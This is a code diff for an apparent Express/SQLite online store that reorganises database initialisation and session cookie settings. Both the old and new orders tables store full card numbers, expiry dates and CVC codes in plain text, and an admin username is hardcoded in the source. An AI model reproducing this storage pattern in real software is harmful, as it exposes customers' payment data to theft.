@@ -8,10 +8,40 @@ const fs = require('fs');
 const puppeteer = require('puppeteer');
 const app = express();
 
-// Update database path for Render
-const dbPath = process.env.NODE_ENV === 'production' 
-  ? '/data/store.db'
-  : './store.db';
+// Create data directory if it doesn't exist
+const dataDir = process.env.NODE_ENV === 'production' ? '/data' : './data';
+if (!fs.existsSync(dataDir)) {
+    fs.mkdirSync(dataDir);
+}
+
+// Update database path
+const dbPath = path.join(dataDir, 'store.db');
+
+// Initialize database
+const db = new sqlite3.Database(dbPath, (err) => {
+    if (err) {
+        console.error('Error opening database:', err);
+    } else {
+        console.log('Connected to database');
+        // Create tables if they don't exist
+        db.run(`CREATE TABLE IF NOT EXISTS orders (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            email TEXT,
+            cardNumber TEXT,
+            cardExpiry TEXT,
+            cvc TEXT,
+            productName TEXT,
+            productPrice REAL,
+            billing1 TEXT,
+            billing2 TEXT,
+            billing3 TEXT,
+            billing4 TEXT,
+            billing5 TEXT,
+            date DATETIME DEFAULT CURRENT_TIMESTAMP,
+            status TEXT DEFAULT 'pending'
+        )`);
+    }
+});
 
 // Add EJS as template engine
 app.set('view engine', 'ejs');
@@ -21,14 +51,23 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(cookieParser());
-app.use(session({
+
+// Session configuration
+const sessionConfig = {
     secret: process.env.SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
     cookie: {
-        maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
+        maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
+        secure: process.env.NODE_ENV === 'production'
     }
-}));
+};
+
+if (process.env.NODE_ENV === 'production') {
+    app.set('trust proxy', 1); // trust first proxy
+}
+
+app.use(session(sessionConfig));
 
 // Admin credentials
 const ADMIN_USERNAME = 'Ronan';
@@ -71,38 +110,6 @@ app.post('/admin/login', (req, res) => {
 app.post('/admin/logout', (req, res) => {
     req.session.destroy();
     res.redirect('/admin');
-});
-
-// Initialize SQLite database
-const db = new sqlite3.Database(dbPath, (err) => {
-    if (err) {
-        console.error('Error opening database:', err);
-    } else {
-        console.log('Connected to SQLite database');
-        // Create orders table if it doesn't exist
-        db.run(`CREATE TABLE IF NOT EXISTS orders (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            date TEXT,
-            status TEXT,
-            email TEXT,
-            cardNumber TEXT,
-            cardExpiry TEXT,
-            cardHolder TEXT,
-            cvc TEXT,
-            productName TEXT,
-            productPrice TEXT,
-            billing1 TEXT,
-            billing2 TEXT,
-            billing3 TEXT,
-            billing4 TEXT,
-            billing5 TEXT,
-            address1 TEXT,
-            address2 TEXT,
-            address3 TEXT,
-            address4 TEXT,
-            address5 TEXT
-        )`);
-    }
 });
 
 // Routes
